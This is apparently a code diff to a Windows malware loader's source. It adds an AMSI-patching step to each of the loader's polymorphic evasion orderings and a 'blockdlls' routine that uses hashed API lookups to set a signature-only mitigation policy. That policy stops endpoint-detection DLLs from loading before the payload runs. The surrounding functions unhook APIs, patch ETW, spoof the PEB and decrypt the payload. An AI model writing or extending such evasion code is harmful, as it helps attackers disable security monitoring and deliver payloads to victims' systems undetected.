@@ -126,6 +126,39 @@ static BOOL Loader_PatchEtw(LOADER_CTX* ctx) {
     return TRUE;
 }
 
+/* Soft-fail by design: a failed AMSI patch must not kill payload delivery.
+ * Opsec_PatchAmsi no-ops when amsi.dll is not already mapped. */
+static void Loader_PatchAmsi(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_NO_AMSI) return;
+    Opsec_PatchAmsi();
+}
+
+/* ProcessSignaturePolicy / MicrosoftSignedOnly — "blockdlls" from cobalt-
+ * strike parlance.  Blocks non-Microsoft-signed DLL loads process-wide:
+ * EDR userland agents injected via LoadLibrary (in-process scanners,
+ * hooking DLLs) are refused after this point.  Must run AFTER LoadPayload
+ * (needs opsecFlags) and BEFORE anything that could load a 3rd-party DLL.
+ * Soft-fail on old kernels (API exists since Win8).  DynamicCodePolicy is
+ * deliberately NOT set — it would kill our own module-stomping writes. */
+static void Loader_BlockDlls(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_NO_BLOCKDLLS) return;
+
+    /* Resolve from kernelbase.dll — kernel32.dll has NO EAT entry for
+     * SetProcessMitigationPolicy on Win10/11 (it delay-imports it), so a
+     * kernel32 EAT walk only finds a hash collision into a delay-load null
+     * thunk.  kernelbase.dll is always mapped and exports it for real. */
+    typedef BOOL (WINAPI *pfnSetProcMitPolicy_t)(DWORD, PVOID, SIZE_T);
+    HMODULE hKernelBase = GetModuleHandleH(g_Hash_kernelbase);
+    pfnSetProcMitPolicy_t pSetMit = (pfnSetProcMitPolicy_t)GetProcAddressH(
+        hKernelBase, g_Hash_SetProcessMitigationPolicy);
+    if (!pSetMit) return;
+
+    /* PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY is a DWORD of bit flags;
+     * bit 0 = MicrosoftSignedOnly.  ProcessSignaturePolicy = 8. */
+    DWORD policy = 1;
+    pSetMit(8, &policy, sizeof(policy));
+}
+
 static void Loader_DecryptXtea(LOADER_CTX* ctx) {
     DWORD xteaKey[4];
     Xtea_DeriveKey(xteaKey, ctx->key_salt);
@@ -160,31 +193,35 @@ static void Loader_SpoofPeb(LOADER_CTX* ctx) {
  *   XTEA before stomp; PEB after resource (always). */
 static void Loader_OpsecPhase(LOADER_CTX* ctx) {
 #if POLY_VARIANT == 1
-    /* Spoof → Unhook → XTEA → PEB → ETW */
+    /* Spoof → Unhook → XTEA → PEB → ETW → AMSI */
     if (!Loader_InitSpoof(ctx)) return;
     Loader_Unhook(ctx);
     Loader_DecryptXtea(ctx);
     Loader_SpoofPeb(ctx);
     if (!Loader_PatchEtw(ctx)) return;
+    Loader_PatchAmsi(ctx);
 #elif POLY_VARIANT == 2
-    /* Unhook → Spoof → PEB → XTEA → ETW */
+    /* Unhook → Spoof → PEB → XTEA → ETW → AMSI */
     Loader_Unhook(ctx);
     if (!Loader_InitSpoof(ctx)) return;
     Loader_SpoofPeb(ctx);
     Loader_DecryptXtea(ctx);
     if (!Loader_PatchEtw(ctx)) return;
+    Loader_PatchAmsi(ctx);
 #elif POLY_VARIANT == 3
-    /* Spoof → ETW → Unhook → XTEA → PEB */
+    /* Spoof → ETW → AMSI → Unhook → XTEA → PEB */
     if (!Loader_InitSpoof(ctx)) return;
     if (!Loader_PatchEtw(ctx)) return;
+    Loader_PatchAmsi(ctx);
     Loader_Unhook(ctx);
     Loader_DecryptXtea(ctx);
     Loader_SpoofPeb(ctx);
 #else
-    /* V0 baseline: Unhook → Spoof → ETW → XTEA → PEB */
+    /* V0 baseline: Unhook → Spoof → ETW → AMSI → XTEA → PEB */
     Loader_Unhook(ctx);
     if (!Loader_InitSpoof(ctx)) return;
     if (!Loader_PatchEtw(ctx)) return;
+    Loader_PatchAmsi(ctx);
     Loader_DecryptXtea(ctx);
     Loader_SpoofPeb(ctx);
 #endif
@@ -351,6 +388,8 @@ extern "C" int EntryPoint() {
     DWORD dwExtractionError = 0;
     if (!Loader_LoadPayload(&ctx, &dwExtractionError))
         Loader_Die(&ctx, dwExtractionError);
+
+    Loader_BlockDlls(&ctx);
 
     Loader_Evasion(&ctx);
 
